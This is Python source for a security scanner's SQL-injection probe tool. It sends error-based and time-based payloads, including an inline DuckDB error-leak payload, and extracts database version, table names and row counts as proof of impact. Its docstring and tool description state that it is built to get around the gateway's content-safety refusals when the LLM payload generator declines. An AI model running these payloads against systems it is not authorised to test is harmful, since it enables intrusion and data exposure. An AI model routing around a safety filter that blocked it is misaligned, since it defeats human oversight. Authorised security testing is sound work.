"""
sqli_probe tool — deterministic, LLM-free SQL-injection probe (a mini sqlmap).

Confirming a SQL injection is a fixed differential: send a syntax-breaking payload and look for a
DBMS error (or a boolean/time differential), then read back a read-only ``version()`` to prove
impact. None of that needs a language model — so this tool runs the whole thing itself from the
static ``sqli.yaml`` seeds and the existing ``sqli_exploit.extract_db_facts`` engine. That makes
SQLi validation immune to the gateway's content-safety refusals that block the LLM payload
generator: the copilot (or the SQL VulnAgent) can call this directly when the model path won't
produce payloads.

Auth is self-contained (cookies from the proxy jar, same source send_request uses) and every
request is routed through the proxy so each step lands in history, in-scope. Payloads are
detection-only (error/boolean/time ≤ the YAML sleep ceiling) — no stacked writes, no data change.
Supports a plain query/body parameter OR a GraphQL variable (e.g. a string field in a mutation).
"""

from __future__ import annotations

import json
import re
import time
from typing import Any, Dict, List, Optional
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from dast.agents.sqli_exploit import extract_db_facts
from dast.graphql.variable_fuzzer import _has_graphql_errors, _inject
from dast.payloads.loader import get_payloads, get_signatures, get_value
from dast.tools.base import Tool, register
from dast.tools.context import ToolContext
from dast.utils.logger import get_logger

logger = get_logger(__name__)

_VALID_SEVERITIES = ("critical", "high", "medium", "low", "info")
_LOCATIONS = ("graphql_var", "query", "body")


def _error_re() -> "re.Pattern":
    """Compile the canonical SQL-error signature set from sqli.yaml. The signatures are regex
    fragments (e.g. ``sql syntax.*near``), joined UNescaped — same as sqli_agent._build_error_re."""
    sigs = get_signatures("sqli", "error_signatures") or []
    if not sigs:
        return re.compile(r"(?!x)x")  # matches nothing
    return re.compile("|".join(sigs), re.IGNORECASE)


def _inject_path(body: dict, dotted: str, value: Any) -> dict:
    """Set a (possibly nested) GraphQL variable under ``variables``, e.g. ``v.contentTitle`` ->
    variables["v"]["contentTitle"]. Deep-copies so the template is not mutated across payloads;
    creates intermediate dicts only if missing (normally the captured operation body already
    carries a valid variables.<obj>, so the other required input fields are preserved)."""
    import copy
    injected = copy.deepcopy(body) if isinstance(body, dict) else {}
    variables = injected.get("variables")
    if not isinstance(variables, dict):
        variables = {}
        injected["variables"] = variables
    parts = [p for p in dotted.split(".") if p]
    node = variables
    for key in parts[:-1]:
        nxt = node.get(key)
        if not isinstance(nxt, dict):
            nxt = {}
            node[key] = nxt
        node = nxt
    if parts:
        node[parts[-1]] = value
    return injected


# DuckDB error(expr) embeds the expression's value in "Invalid Input Error: <value>" (also
# "Conversion Error: ..."), so a `(SELECT error(version()))` payload leaks version() in the
# GraphQL errors[] message. Parse that out as read-only impact proof.
_DUCKDB_LEAK_RE = re.compile(r"(?:invalid input error|conversion error|binder error)\s*:\s*"
                             r"([^\"'}\n]{1,120})", re.IGNORECASE)
_VERSION_RE = re.compile(r"v?\d+\.\d+(?:\.\d+)?")


def _graphql_error_messages(text: str) -> list:
    import json as _json
    try:
        data = _json.loads(text)
    except Exception:
        return []
    errs = data.get("errors") if isinstance(data, dict) else None
    out = []
    for e in (errs if isinstance(errs, list) else []):
        msg = e.get("message") if isinstance(e, dict) else None
        if isinstance(msg, str):
            out.append(msg)
    return out


def _extract_duckdb_version(text: str) -> Optional[str]:
    """Pull a leaked version()/value out of a DuckDB error surfaced in a GraphQL errors[] message."""
    for msg in _graphql_error_messages(text):
        m = _DUCKDB_LEAK_RE.search(msg)
        if m:
            cand = m.group(1).strip()
            vm = _VERSION_RE.search(cand)
            return vm.group(0) if vm else cand[:80]
    return None


# DuckDB error families — used to detect the backend (DuckDB is not in db_dialect._DB_MARKERS).
_DUCKDB_SIGNATURE_RE = re.compile(
    r"invalid input error|binder error|catalog error|conversion error|parser error|duckdb",
    re.IGNORECASE)


def _detect_dbms(error_text: str) -> str:
    """Best-effort backend from a SQL error. DuckDB first (not covered by db_dialect), else the
    networked dialects via db_dialect.definite_db, else 'unknown'."""
    if _DUCKDB_SIGNATURE_RE.search(error_text or ""):
        return "DuckDB"
    try:
        from dast.agents.db_dialect import definite_db
        return definite_db([error_text or ""]) or "unknown"
    except Exception:
        return "unknown"


def _duckdb_leak_payload(label: str, inner_sql: str) -> str:
    """A read-only DuckDB error-leak payload: break out of the string literal and embed the result
    of ``inner_sql`` (metadata only) after ``label=`` in a DuckDB error message."""
    return f"x', (SELECT error(CONCAT('{label}=', ({inner_sql})))) as v, '"


def _extract_labeled_leak(text: str, label: str) -> Optional[str]:
    """Pull ``<label>=<value>`` out of a DuckDB error surfaced in a GraphQL errors[] message
    (schema/count metadata, never a secret). Returns the value (<= 500 chars) or None."""
    pat = re.compile(re.escape(label) + r"=([^\"'}\n]{0,500})")
    for msg in _graphql_error_messages(text):
        m = pat.search(msg)
        if m:
            return m.group(1).strip()
    return None


_EMBEDDED_DBMS = ("DuckDB", "SQLite")
_NETWORKED_DBMS = ("MySQL", "PostgreSQL", "MSSQL", "Oracle")


def _severity_for(dbms: str, scope_bypass: str) -> "tuple[str, str]":
    """Default finding severity + rationale from the detected DBMS and the scope-bypass verdict.
    Embedded DBs (no RCE/file/write) are confidentiality-only; severity turns on whether the read
    crossed the authorized scope. The operator can still override via the ``severity`` arg."""
    if dbms in _EMBEDDED_DBMS:
        if scope_bypass == "true":
            return "high", (f"{dbms} is embedded (no RCE/file/write) but the injection reads data "
                            "BEYOND the user's authorized scope")
        if scope_bypass == "false":
            return "low", (f"{dbms} is embedded; the injection reads only data already within the "
                           "user's authorized scope")
        return "medium", (f"{dbms} is embedded (no RCE/file/write); read-only SQLi confirmed, scope "
                          "bypass not confirmed")
    if dbms in _NETWORKED_DBMS:
        return "high", (f"networked {dbms}: read-only SQLi confirmed; broader impact "
                        "(stacked writes / file / possible RCE) may be reachable")
    return "medium", "DBMS unknown; read-only SQLi confirmed, impact bounds undetermined"


_SCHEMA: Dict[str, Any] = {
    "type": "object",
    "properties": {
        "url": {"type": "string", "description": "Target URL (must be in scope). For GraphQL, the "
                "graphql endpoint, e.g. https://host/reports/graphql/."},
        "method": {"type": "string", "description": "HTTP method (default POST)."},
        "injection_point": {"type": "string", "description": "Parameter / GraphQL variable to "
                            "inject into, e.g. 'title' or 'id'. For a GraphQL variable NESTED in an "
                            "input object, use a dotted path relative to variables, e.g. "
                            "'v.contentTitle' for variables.v.contentTitle."},
        "injection_location": {"type": "string", "description": "Where the parameter lives: "
                               "'graphql_var' (a GraphQL variable), 'query' (URL query string), or "
                               "'body' (JSON/form body). Default 'graphql_var'."},
        "body": {"type": "string", "description": "Request body template. For graphql_var a JSON "
                 "{query, variables, operationName}. If omitted for graphql_var, the most recent "
                 "captured operation for this URL is used."},
        "content_type": {"type": "string", "description": "Content-Type for the request (default "
                         "application/json)."},
        "record": {"type": "boolean", "description": "Record a finding when CONFIRMED (default true)."},
        "title": {"type": "string", "description": "Finding title (optional; a sensible default is used)."},
        "severity": {"type": "string", "description": "critical|high|medium|low|info. If omitted, "
                     "severity is calibrated from the detected DBMS + scope-bypass verdict."},
        "cwe": {"type": "string", "description": "CWE id (default CWE-89)."},
        "target_table": {"type": "string", "description": "Optional. A table name to quantify impact "
                         "against (DuckDB/graphql_var): leaks its COUNT(*) and column NAMES via "
                         "information_schema (NEVER column values / PII). Used to measure reach."},
        "scope_where": {"type": "string", "description": "Optional SQL predicate describing the "
                        "user's AUTHORIZED subset of target_table (e.g. an account/group filter). "
                        "The probe compares total COUNT(*) vs COUNT(*) WHERE <scope_where> to decide "
                        "whether the read crosses the authorized scope (scope_bypass)."},
    },
    "required": ["url", "injection_point"],
}


async def _resolve_auth(ctx: ToolContext, url: str, method: str) -> Dict[str, Any]:
    """Resolve the SAME auth send_request uses, so the probe can reach a Bearer-authed sub-app
    (e.g. a reports GraphQL endpoint) instead of 403ing with jar cookies alone: jar cookies + the
    sub-app Bearer (from the engine's /spa/session) + a CSRF token from history. Resolved ONCE
    (host/path are constant across payloads); applied per request via auth_provider.attach.
    Never raises."""
    store = getattr(ctx, "store", None)
    parsed = urlparse(url)
    host, path = parsed.hostname or "", parsed.path or "/"
    jar_cookie_map: Dict[str, str] = {}
    if store is not None:
        try:
            jar = store.get_cookies_for_host(host) or []
            jar_cookie_map = {c.get("name"): c.get("value", "") for c in jar if c.get("name")}
        except Exception as exc:
            logger.debug("sqli_probe: cookie jar lookup failed", host=host, error=str(exc))
    rec = None
    session = getattr(ctx, "_session", None)
    try:
        from dast.session.auth_provider import scan_history_bearer
        if session is not None and store is not None and hasattr(session, "_ensure_fresh_bearer"):
            rec = await session._ensure_fresh_bearer(
                store, host, path, browser=getattr(ctx, "browser", None))
        elif store is not None:
            rec = scan_history_bearer(store, host, path)
    except Exception as exc:
        logger.debug("sqli_probe: bearer resolution failed", host=host, error=str(exc))
    csrf_token = None
    if store is not None and method in ("POST", "PUT", "PATCH", "DELETE"):
        try:
            from dast.session.auth_provider import scan_history_csrf
            csrf_token = scan_history_csrf(store, host, exclude_source="copilot")
        except Exception as exc:
            logger.debug("sqli_probe: csrf resolution failed", host=host, error=str(exc))
    return {"cookies": jar_cookie_map or None, "bearer_rec": rec, "csrf_token": csrf_token}


def _resolve_graphql_body(ctx: ToolContext, url: str, given_body: str) -> Optional[dict]:
    """Return the GraphQL request body dict: the caller-supplied one, else the most recent
    captured operation for this URL from history."""
    if given_body.strip():
        try:
            data = json.loads(given_body)
            if isinstance(data, dict) and data.get("query"):
                return data
        except Exception:
            return None
    store = getattr(ctx, "store", None)
    if store is None:
        return None
    try:
        from dast.tools.graphql_fuzz_tools import _captured_operations
        ops = _captured_operations(store, url)
    except Exception as exc:
        logger.warning("sqli_probe: captured-op lookup failed", error=str(exc))
        return None
    if not ops:
        return None
    # ops entries are (op_key, body_dict, auth_headers); take the first.
    return ops[0][1] if isinstance(ops[0][1], dict) else None


def _set_query_param(url: str, param: str, value: str) -> str:
    parts = urlparse(url)
    q = dict(parse_qsl(parts.query, keep_blank_values=True))
    q[param] = value
    return urlunparse(parts._replace(query=urlencode(q)))


async def _sqli_probe(ctx: ToolContext, args: Dict[str, Any]) -> Dict[str, Any]:
    url = str(args.get("url", "")).strip()
    point = str(args.get("injection_point", "")).strip()
    location = str(args.get("injection_location", "graphql_var")).strip().lower() or "graphql_var"
    method = str(args.get("method", "POST")).strip().upper() or "POST"
    content_type = str(args.get("content_type", "application/json")).strip() or "application/json"
    if not url or not point:
        return {"ok": False, "error": "url and injection_point are required"}
    if location not in _LOCATIONS:
        return {"ok": False, "error": f"injection_location must be one of {_LOCATIONS}"}
    if not ctx.is_in_scope(url):
        return {"ok": False, "error": "url is out of scope", "url": url}

    gql_body: Optional[dict] = None
    if location == "graphql_var":
        gql_body = _resolve_graphql_body(ctx, url, str(args.get("body", "")))
        if gql_body is None:
            return {"ok": False, "error": "no GraphQL body given and none captured for this URL — "
                    "pass 'body' as {query, variables, operationName} JSON"}

    source_label = getattr(ctx, "source_label", None)
    # Resolve cookies + sub-app Bearer + CSRF once (same machinery as send_request), applied to
    # each request via attach so a Bearer-authed sub-app (e.g. /reports/graphql) is reachable.
    from dast.session.auth_provider import attach as _attach
    auth = await _resolve_auth(ctx, url, method)

    def _headers() -> Dict[str, str]:
        # X-Requested-With explicitly: some SPA sub-apps require it even when auth is a Bearer with
        # no CSRF (attach only sets it alongside a CSRF token).
        h: Dict[str, str] = {"content-type": content_type, "X-Requested-With": "XMLHttpRequest"}
        if source_label:
            h["x-dast-source"] = str(source_label)
        _attach(h, transport="api", cookies=auth["cookies"], bearer_rec=auth["bearer_rec"],
                csrf_token=auth["csrf_token"], drop_all_authorization=True)
        return h

    import httpx

    time_threshold_ms = float(get_value("sqli", "time_threshold_ms", 4500) or 4500)

    async def _send_value(client: "httpx.AsyncClient", value: str) -> Optional["httpx.Response"]:
        """Inject ``value`` at the chosen point and send through the proxy. Returns the response."""
        try:
            if location == "graphql_var":
                # Dotted injection_point (e.g. v.contentTitle) targets a NESTED input field; a
                # plain name is a top-level variable (reuse the shared helper).
                injected = (_inject_path(gql_body, point, value) if "." in point
                            else _inject(gql_body, point, value))
                return await client.request(method, url, headers=_headers(),
                                            content=json.dumps(injected).encode("utf-8"))
            if location == "query":
                return await client.request(method, _set_query_param(url, point, value),
                                            headers=_headers())
            # body: JSON object field
            body_obj = {point: value}
            return await client.request(method, url, headers=_headers(),
                                        content=json.dumps(body_obj).encode("utf-8"))
        except Exception as exc:
            logger.debug("sqli_probe: send failed", error=str(exc)[:160])
            return None

    err_re = _error_re()
    steps: List[Dict[str, Any]] = []
    confirmed = False
    technique = ""
    confirming_payload = ""
    evidence_snippet = ""

    try:
        async with httpx.AsyncClient(proxy=ctx.proxy_url, verify=False,
                                     follow_redirects=False, timeout=30) as client:
            # Baseline (benign value) — to tell a NEW sql error / graphql error from a pre-existing one.
            base = await _send_value(client, "sqli_probe_baseline")
            base_text = base.text if base is not None else ""
            base_sql_err = bool(err_re.search(base_text))
            base_gql_err = _has_graphql_errors(base_text)
            steps.append({"label": "baseline", "status": getattr(base, "status_code", None),
                          "sql_error": base_sql_err, "graphql_error": base_gql_err})

            # Error-based: a syntax-breaking payload that yields a NEW SQL error is the strong signal.
            for payload in get_payloads("sqli", "error_based"):
                resp = await _send_value(client, payload)
                if resp is None:
                    continue
                text = resp.text
                new_sql_err = bool(err_re.search(text)) and not base_sql_err
                new_gql_err = _has_graphql_errors(text) and not base_gql_err
                if new_sql_err or new_gql_err:
                    confirmed = True
                    technique = "error-based"
                    confirming_payload = payload
                    m = err_re.search(text)
                    evidence_snippet = (m.group(0) if m else text)[:300]
                    steps.append({"label": "error-based hit", "payload": payload,
                                  "status": resp.status_code,
                                  "sql_error": new_sql_err, "graphql_error": new_gql_err,
                                  "snippet": evidence_snippet})
                    break
                steps.append({"label": "error-based miss", "payload": payload,
                              "status": resp.status_code})

            # Time-based fallback only if error-based did not confirm.
            if not confirmed:
                for payload in get_payloads("sqli", "time_based"):
                    t0 = time.monotonic()
                    resp = await _send_value(client, payload)
                    elapsed_ms = (time.monotonic() - t0) * 1000.0
                    if resp is None:
                        continue
                    if elapsed_ms >= time_threshold_ms:
                        confirmed = True
                        technique = "time-based"
                        confirming_payload = payload
                        evidence_snippet = f"response delayed {elapsed_ms:.0f}ms (>= {time_threshold_ms:.0f}ms)"
                        steps.append({"label": "time-based hit", "payload": payload,
                                      "elapsed_ms": round(elapsed_ms), "status": resp.status_code})
                        break
                    steps.append({"label": "time-based miss", "payload": payload,
                                  "elapsed_ms": round(elapsed_ms)})

            # Impact proof: best-effort read-only version()/db/user extraction (error-based only).
            facts: Dict[str, str] = {}
            proof_summary = ""
            dbms = "unknown"
            scope_bypass = "unknown"
            if confirmed and technique == "error-based":
                async def _send(value: str) -> Optional["httpx.Response"]:
                    return await _send_value(client, value)
                try:
                    proof = await extract_db_facts(_send, confirming_payload, dbms_hints=None)
                except Exception as exc:
                    proof = None
                    logger.debug("sqli_probe: extraction failed", error=str(exc)[:160])
                if proof is not None:
                    facts = dict(proof.facts)
                    proof_summary = proof.summary()
                    steps.append({"label": "impact proof", "technique": proof.technique,
                                  "dbms": proof.dbms, "facts": facts})
                # DuckDB version-leak oracle (GraphQL errors[]): extract_db_facts does not cover
                # DuckDB, so when nothing was extracted, try the read-only error(version()) leak and
                # parse the version from the GraphQL error message. Best-effort; keeps CONFIRMED.
                if not facts and location == "graphql_var":
                    for payload in get_payloads("sqli", "duckdb_version"):
                        resp = await _send_value(client, payload)
                        if resp is None:
                            continue
                        ver = _extract_duckdb_version(resp.text)
                        if ver:
                            facts = {"version": ver}
                            technique = "error-based (DuckDB version leak)"
                            proof_summary = f"DuckDB version()={ver} leaked via error()"
                            steps.append({"label": "duckdb version leak", "payload": payload,
                                          "version": ver})
                            break

                # DBMS from the confirming error (DuckDB isn't in db_dialect, so detect it here).
                dbms = _detect_dbms(evidence_snippet)

                # Deterministic impact facts + scope-bypass differential (DuckDB/graphql_var only).
                # All reads are schema/count metadata via the read-only error(CONCAT(...)) leak —
                # NEVER column values / PII. Bounded to a few extra requests, only when meaningful.
                if dbms == "DuckDB" and location == "graphql_var":
                    fact_sql: Dict[str, str] = get_value("sqli", "duckdb_fact_sql", {}) or {}

                    async def _leak(label: str, inner_sql: str) -> Optional[str]:
                        if not inner_sql:
                            return None
                        resp = await _send_value(client, _duckdb_leak_payload(label, inner_sql))
                        return _extract_labeled_leak(resp.text, label) if resp is not None else None

                    tables = await _leak("TBLS", fact_sql.get("tables", ""))
                    if tables:
                        facts["reachable_tables"] = tables
                        steps.append({"label": "reachable tables", "value": tables})

                    target = str(args.get("target_table", "")).strip()
                    if target:
                        rc = await _leak("RC", fact_sql.get("row_count", "").format(table=target))
                        cols = await _leak("COLS", fact_sql.get("columns", "").format(table=target))
                        if rc:
                            facts["row_count"] = rc
                        if cols:
                            facts["columns"] = cols
                        steps.append({"label": "target-table facts", "table": target,
                                      "row_count": rc, "columns": cols})

                        where = str(args.get("scope_where", "")).strip()
                        if where and rc:
                            srec = fact_sql.get("scoped_count", "")
                            try:
                                scoped_sql = srec.format(table=target, where=where)
                            except (KeyError, IndexError):
                                scoped_sql = ""
                            scoped = await _leak("SRC", scoped_sql)
                            if scoped:
                                try:
                                    scope_bypass = "true" if int(scoped) < int(rc) else "false"
                                except ValueError:
                                    scope_bypass = "unknown"
                                facts["scoped_row_count"] = scoped
                                steps.append({"label": "scope differential", "total": rc,
                                              "scoped": scoped, "scope_bypass": scope_bypass})
    except Exception as exc:
        return {"ok": False, "error": f"probe failed: {str(exc)[:200]}", "steps": steps}

    if confirmed:
        verdict = (f"CONFIRMED — {technique} SQL injection in '{point}' ({location}). "
                   f"Payload {confirming_payload!r} produced: {evidence_snippet}."
                   + (f" Read-only proof: {proof_summary}." if proof_summary else ""))
    else:
        verdict = (f"NOT CONFIRMED — no SQL error differential or timing delay for '{point}' "
                   f"({location}).")

    # Calibrate the default severity from DBMS + scope; the operator can still override via `severity`.
    computed_sev, sev_rationale = _severity_for(dbms, scope_bypass)
    sev_arg = str(args.get("severity", "")).strip().lower()
    severity = sev_arg if sev_arg in _VALID_SEVERITIES else computed_sev

    result: Dict[str, Any] = {"ok": True, "confirmed": confirmed, "verdict": verdict,
                              "technique": technique, "facts": facts if confirmed else {},
                              "dbms": dbms, "scope_bypass": scope_bypass,
                              "severity": severity if confirmed else None,
                              "severity_rationale": sev_rationale if confirmed else None,
                              "steps": steps}

    if confirmed and bool(args.get("record", True)) and getattr(ctx, "store", None) is not None:
        evidence = verdict + f" [backend={dbms}; scope_bypass={scope_bypass}; {sev_rationale}]"
        finding = {
            "title": str(args.get("title", "")).strip()
            or f"SQL injection in '{point}' ({technique})",
            "severity": severity,
            "attack_type": "sqli",
            "cwe": str(args.get("cwe", "CWE-89")).strip() or "CWE-89",
            "parameter": point,
            "evidence": evidence,
            "dbms": dbms,
            "scope_bypass": scope_bypass,
            "steps": steps,
            "extracted_data": facts,
            "confirmed": True,
            "confidence": 1.0,
            "validated_by": ["sqli_probe"],
            "source": "copilot",
        }
        try:
            entry_id = ctx.store.record_manual_finding(finding, url, method)
            result["recorded_entry_id"] = entry_id
            logger.info("sqli_probe recorded finding", entry_id=entry_id, severity=severity,
                        technique=technique)
        except Exception as exc:
            result["record_error"] = str(exc)[:200]

    return result


register(Tool(
    name="sqli_probe",
    description=(
        "Deterministically probe ONE parameter or GraphQL variable for SQL injection — no LLM, so "
        "the gateway's content-safety filter cannot block it. Sends static error-based then "
        "time-based payloads, detects a NEW SQL-error / GraphQL-error differential or a timing "
        "delay vs a baseline, and on a hit extracts a read-only version()/database()/user() proof. "
        "Records a CONFIRMED finding with the full step chain + extracted facts as evidence. "
        "injection_location: 'graphql_var' (inject into a GraphQL variable; the "
        "captured operation body is reused if you don't pass one), 'query', or 'body'. Cookies come "
        "from the proxy jar automatically; everything routes through the proxy. "
        "Use this to validate a suspected SQLi reliably, or when the LLM payload path refuses."
    ),
    input_schema=_SCHEMA,
    handler=_sqli_probe,
    tags=["active", "write"],
))
